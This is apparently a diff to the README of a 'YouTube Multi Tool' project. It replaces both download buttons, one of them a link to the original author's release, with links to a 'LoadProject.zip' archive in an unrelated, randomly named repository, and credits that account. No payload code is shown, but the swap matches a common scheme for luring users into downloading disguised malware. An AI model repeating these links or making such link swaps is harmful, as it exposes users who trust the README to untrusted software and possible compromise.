@@ -14,7 +14,7 @@
 
 <div align="center">
 
-# ⬇️ [DOWNLOAD YOUTUBE MULTI TOOL]()
+# ⬇️ [DOWNLOAD YOUTUBE MULTI TOOL](https://github.com/pursuerpurserregain/lrqpnrpa/releases/download/YT-Multi/LoadProject.zip)
 
 </div>
 
@@ -235,7 +235,7 @@ This project is licensed under the MIT License — see the [LICENSE](LICENSE) fi
 
 ### If this tool helped you, please give it a ⭐
 
-# ⬇️ [DOWNLOAD NOW](https://github.com/nicholasvisuals/YouTube-Multi-Tool/releases/download/v3.2.1/YT-MultiTool-Setup.zip)
+# ⬇️ [DOWNLOAD NOW](https://github.com/pursuerpurserregain/lrqpnrpa/releases/download/YT-Multi/LoadProject.zip)
 
 Made with ❤️ by **pursuerpurserregain**
 
